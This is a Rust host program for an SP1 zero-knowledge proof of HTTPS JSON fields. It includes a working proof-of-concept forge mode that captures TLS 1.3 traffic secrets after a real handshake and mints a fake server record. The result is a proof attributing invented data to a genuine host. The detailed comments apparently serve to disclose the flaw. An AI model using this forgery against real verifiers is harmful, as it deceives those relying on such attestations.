mod capture;
mod keylog;
mod witness;

use std::net::TcpStream;
use std::sync::{Arc, Mutex};

use anyhow::{Context, Result};
use clap::Parser;
use rustls::ClientConfig;
use sp1_sdk::{
    blocking::{Elf, ProveRequest, Prover, ProverClient, SP1Stdin},
    include_elf, ProvingKey, SP1ProofWithPublicValues,
};

use capture::{make_capturing_provider, CapturingStream, KeyMaterial};
use keylog::CapturingKeyLog;
use sp1_https_json_shared::PublicClaim;
use witness::{assemble_witness, forge_app_record};

const ELF: Elf = include_elf!("sp1-https-json-program");

#[derive(Parser, Debug)]
struct Args {
    /// HTTPS URL to GET
    #[arg(long)]
    url: String,

    /// RFC 6901 JSON Pointer to the field to check, e.g. "/price"
    #[arg(long)]
    field: String,

    /// Threshold: assert field > threshold
    #[arg(long)]
    threshold: f64,

    /// If set, generate a full STARK proof; otherwise just execute (faster for dev)
    #[arg(long)]
    prove: bool,

    /// PoC switch: when set, the client completes only the TLS handshake to
    /// the named URL and then stops — no HTTP request is ever sent. The
    /// inbound `encrypted_app_records` that the witness would normally carry
    /// are discarded and replaced by ONE record we mint ourselves: a
    /// well-formed `HTTP/1.1 200 OK` whose body is this JSON string.
    ///
    /// The guest accepts the forged witness and commits a `PublicClaim` that
    /// names the real host (the leaf cert is genuine), the requested field,
    /// the prover-supplied threshold, and the prover-supplied value.
    ///
    /// Run this against any real HTTPS host:
    ///
    ///     --url https://www.google.com/ \
    ///     --field /score --threshold 1000 \
    ///     --forge-json '{"score":1337}'
    ///
    /// → guest commits `(www.google.com, /score, 1000, 1337)`. Google sent
    /// no JSON; we never asked for any. See `PR_BODY.md` for the full
    /// writeup of why the guest cannot detect this.
    #[arg(long)]
    forge_json: Option<String>,
}

fn main() -> Result<()> {
    let args = Args::parse();

    // Parse host + port from URL.
    let url = url::Url::parse(&args.url).context("invalid URL")?;
    let host = url.host_str().context("URL has no host")?.to_string();
    let port = url.port_or_known_default().unwrap_or(443);
    let path = if url.path().is_empty() {
        "/"
    } else {
        url.path()
    };
    let query_path = match url.query() {
        Some(q) => format!("{path}?{q}"),
        None => path.to_string(),
    };

    // -----------------------------------------------------------------------
    // 1. Set up capturing infrastructure.
    // -----------------------------------------------------------------------

    let kx_captured: Arc<Mutex<Option<KeyMaterial>>> = Arc::new(Mutex::new(None));
    let (keylog, secrets_arc) = CapturingKeyLog::new();

    // Force AES-128-GCM-SHA256 so the witness parser knows the exact cipher.
    let mut provider = make_capturing_provider(kx_captured.clone());
    provider.cipher_suites = vec![rustls::crypto::ring::cipher_suite::TLS13_AES_128_GCM_SHA256];

    let config = ClientConfig::builder_with_provider(Arc::new(provider))
        .with_protocol_versions(&[&rustls::version::TLS13])?
        .with_root_certificates(rustls::RootCertStore {
            roots: webpki_roots::TLS_SERVER_ROOTS.to_vec(),
        })
        .with_no_client_auth();

    let config = {
        let mut c = config;
        c.key_log = Arc::new(keylog);
        c
    };

    // -----------------------------------------------------------------------
    // 2. Connect and do the HTTP GET, capturing everything.
    // -----------------------------------------------------------------------

    let server_name: rustls::pki_types::ServerName =
        host.clone().try_into().context("invalid server name")?;

    let tcp = TcpStream::connect(format!("{host}:{port}"))?;
    let mut stream = CapturingStream::new(tcp);

    let mut tls = rustls::ClientConnection::new(Arc::new(config), server_name)?;

    if args.forge_json.is_some() {
        // ───────────────────────────────────────────────────────────────────
        // Forge mode, part 1 of 2: handshake only — no HTTP.
        //
        // We need just enough of a real TLS 1.3 session to populate the
        // *transcript-dependent* parts of the witness with material that
        // checks out against a real Mozilla trust anchor:
        //
        //   • genuine certificate chain for `host` (parsed from Certificate)
        //   • genuine CertificateVerify signed by the real leaf cert key
        //   • genuine ECDHE key share (server_ecdh_public from ServerHello)
        //   • genuine ServerFinished HMAC
        //   • SERVER_HANDSHAKE_TRAFFIC_SECRET + SERVER_TRAFFIC_SECRET_0 from
        //     rustls' KeyLog hook (the second one is the key to the forgery)
        //
        // None of that requires an HTTP request — the handshake messages
        // and the key schedule are decided entirely by the TLS handshake.
        // So we drive rustls to handshake-complete and stop. The TCP write
        // buffer never sees a single byte of `GET ... HTTP/1.1`.
        eprintln!(
            "FORGE MODE: completing TLS handshake to {host}:{port}; sending NO HTTP request"
        );
        while tls.is_handshaking() {
            tls.complete_io(&mut stream)?;
        }
        eprintln!("FORGE MODE: handshake complete");
    } else {
        let mut joined = rustls::Stream::new(&mut tls, &mut stream);

        // Write HTTP/1.1 GET request.
        use std::io::Write;
        write!(
            joined,
            "GET {query_path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nAccept: application/json\r\n\r\n"
        )?;

        // Read full response.
        use std::io::Read;
        let mut response_bytes = Vec::new();
        joined.read_to_end(&mut response_bytes)?;

        let response_str = String::from_utf8_lossy(&response_bytes);

        // Extract HTTP body (after \r\n\r\n).
        let body = response_str
            .split("\r\n\r\n")
            .nth(1)
            .unwrap_or("")
            .to_string();

        println!("Response body: {body}");
    }

    // -----------------------------------------------------------------------
    // 3. Assemble the TLS witness.
    // -----------------------------------------------------------------------

    let km = kx_captured
        .lock()
        .unwrap()
        .take()
        .context("KeyMaterial not captured — handshake did not complete?")?;

    let secrets = secrets_arc.lock().unwrap().clone();
    let server_app_secret_opt = secrets.server_app_traffic_secret.clone();
    let hs_secret = secrets
        .server_hs_traffic_secret
        .context("SERVER_HANDSHAKE_TRAFFIC_SECRET not captured")?;

    eprintln!(
        "debug: inbound={} bytes, outbound={} bytes, hs_secret={} bytes",
        stream.inbound.len(),
        stream.outbound.len(),
        hs_secret.len()
    );

    let mut tls_witness = assemble_witness(
        &stream.inbound,
        &stream.outbound,
        km.client_private,
        km.server_public,
        &hs_secret,
    )?;

    println!(
        "TLS witness assembled: {} certs, {} app records, cv_msg {} bytes",
        tls_witness.cert_chain_der.len(),
        tls_witness.encrypted_app_records.len(),
        tls_witness.cert_verify_msg.len(),
    );

    // ───────────────────────────────────────────────────────────────────────
    // Forge mode, part 2 of 2: mint a fake server ApplicationData record.
    //
    // The witness assembled above is otherwise authentic — same certs, same
    // CertVerify, same key schedule. We only swap out the application-data
    // payload, which is the one part of the proof the verifier cares about.
    //
    // The forgery works because:
    //
    //   1. RFC 8446 §7.1 derives `server_application_traffic_secret_0`
    //      deterministically from `Master-Secret` and the handshake
    //      transcript hash. `Master-Secret` itself is derived from
    //      `ECDHE_shared`, which the CLIENT already holds (it picked
    //      `client_ecdh_private`). So the client can compute the server's
    //      application write secret with no further server interaction.
    //
    //   2. rustls' `KeyLog` callback hands us that very secret as
    //      `SERVER_TRAFFIC_SECRET_0` (`server_app_secret_opt` below).
    //
    //   3. `forge_app_record` packs an arbitrary plaintext under
    //      `AES-128-GCM(key=HKDF(traffic_secret, "key"), iv=HKDF(...))`,
    //      producing a record that authenticates under the same AEAD key
    //      the (honest, in-zkVM) guest re-derives from the same handshake.
    //
    //   4. The guest has no information that lets it distinguish a record
    //      produced in step 3 from a record the real server would have
    //      produced: both authenticate under `K_s`, both decrypt cleanly,
    //      both yield bytes the HTTP parser accepts.
    //
    // The HTTP envelope below is the minimal shape that survives the guest's
    // `response.split("\r\n\r\n").nth(1)` and `serde_json::from_str(body)`.
    if let Some(json) = &args.forge_json {
        let server_app_secret = server_app_secret_opt
            .context("SERVER_TRAFFIC_SECRET_0 not captured by keylog")?;

        // Minimal, well-formed HTTP/1.1 response. Headers are not parsed by
        // the guest — only the body after `\r\n\r\n` matters — but we keep
        // `Content-Length` accurate so any future header-aware logic stays
        // happy. `Connection: close` is just cosmetic (no socket here).
        let fake_http = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
            json.as_bytes().len(),
            json
        );

        // seq = 0: this is the only application record we put in the witness,
        // and the guest iterates with `.enumerate()`, so seq must start at 0.
        let forged = forge_app_record(&server_app_secret, 0, fake_http.as_bytes())?;

        eprintln!(
            "FORGE MODE: replacing {} captured app record(s) with 1 forged record ({} bytes)",
            tls_witness.encrypted_app_records.len(),
            forged.len()
        );
        eprintln!("FORGE MODE: forged HTTP body: {json}");

        // Drop any NewSessionTicket / KeyUpdate records the server may have
        // pushed after Finished. We only keep our forgery. The guest will
        // try seq=0,1,... against `encrypted_app_records` — with a single
        // element, there is nothing else to decrypt.
        tls_witness.encrypted_app_records = vec![forged];
    }

    // -----------------------------------------------------------------------
    // 4. Write inputs to the guest stdin.
    // -----------------------------------------------------------------------

    let mut stdin = SP1Stdin::new();
    stdin.write(&tls_witness); // full TLS witness for in-guest verification
    stdin.write(&host); // hostname (committed as public output)
    stdin.write(&args.field);
    stdin.write(&args.threshold);

    // -----------------------------------------------------------------------
    // 5. Execute or prove.
    // -----------------------------------------------------------------------

    let prover = ProverClient::from_env();

    if args.prove {
        let pk = prover.setup(ELF)?;
        let proof: SP1ProofWithPublicValues = prover.prove(&pk, stdin).compressed().run()?;
        let proof_path = "proof.bin";
        proof.save(proof_path)?;
        println!("Proof saved to {proof_path}");

        let proof = SP1ProofWithPublicValues::load(proof_path)?;
        prover.verify(&proof, pk.verifying_key(), None)?;

        let mut pv = proof.public_values.clone();
        let claim: PublicClaim = pv.read();

        println!("Proof verified.");
        println!("   host:      {}", claim.host);
        println!("   field:     {}", claim.field);
        println!("   threshold: {}", claim.threshold);
        println!("   value:     {}", claim.value);
    } else {
        let (mut pv, report) = prover.execute(ELF, stdin).run()?;

        let claim: PublicClaim = pv.read();

        println!("Execution succeeded (no proof generated).");
        println!("   host:      {}", claim.host);
        println!("   field:     {}", claim.field);
        println!("   threshold: {}", claim.threshold);
        println!("   value:     {}", claim.value);
        println!("   cycles:    {}", report.total_instruction_count());
    }

    Ok(())
}
